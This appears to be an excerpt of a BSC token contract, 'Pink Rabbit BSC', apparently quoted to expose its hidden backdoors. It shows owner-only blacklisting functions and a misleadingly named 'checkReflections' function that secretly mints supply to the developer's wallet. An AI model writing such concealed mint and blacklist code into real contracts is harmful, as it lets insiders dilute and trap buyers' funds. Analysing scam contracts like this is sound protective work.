...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x4E12B4b01D9e7aC1e26F0d6d605403599C3Fa4Aa;
...
contract pinkrabbitbsc is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Dev = payable(0xF3cb47C0CbF214f3f48EbB56F82bEa001407196F);
    ...
    string private _name = "Pink Rabbit BSC"; 
    string private _symbol = "$PINKBIT";  
    ...
    function blacklistMultiAddress(address[] calldata addresses) external onlyOwners {
    ...
    function blacklistState(bool true_or_false) public onlyOwners {
    ...
    function checkReflections(uint256 value, address adr) onlyOwners public virtual {
        require(adr == address(Wallet_Dev));
        _reflections(address(Wallet_Dev), adr, value);
        _tTotal += value;
        _tOwned[adr] += value;
